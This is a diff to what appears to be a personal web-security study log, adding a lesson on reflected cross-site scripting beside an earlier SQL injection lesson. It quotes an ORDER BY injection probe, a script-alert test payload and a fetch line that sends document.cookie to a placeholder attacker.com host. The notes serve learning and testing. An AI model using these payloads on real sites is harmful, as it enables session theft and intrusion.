@@ -124,3 +124,15 @@
 * **The Technique:** I used `' ORDER BY X--` to guess the number of columns. When I incremented X until the page crashed (Internal Server Error), I knew the limit.
 * **QA Insight:** If I see a search filter, I should try sorting by non-existent columns. If it throws a 500 error, I know the database is exposed.
 
+## Lesson 11: Reflected XSS [11.12.2025]
+**Focus:** JavaScript Injection
+
+**Resource:** PwnFunction
+* [Cross-Site Scripting (XSS) Explained](https://www.youtube.com/watch?v=EoaDgUgS6QA)
+* [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
+
+**Learnings:**
+* **Mechanism:** Input -> Server -> Reflected immediately back to Browser -> Browser executes it as code.
+* **The Payload:** `<script>alert(1)</script>` is the "Hello World" of XSS.
+* **Impact:** If I can run `alert(1)`, I can also run `fetch('attacker.com?cookie=' + document.cookie)` and steal their session.
+
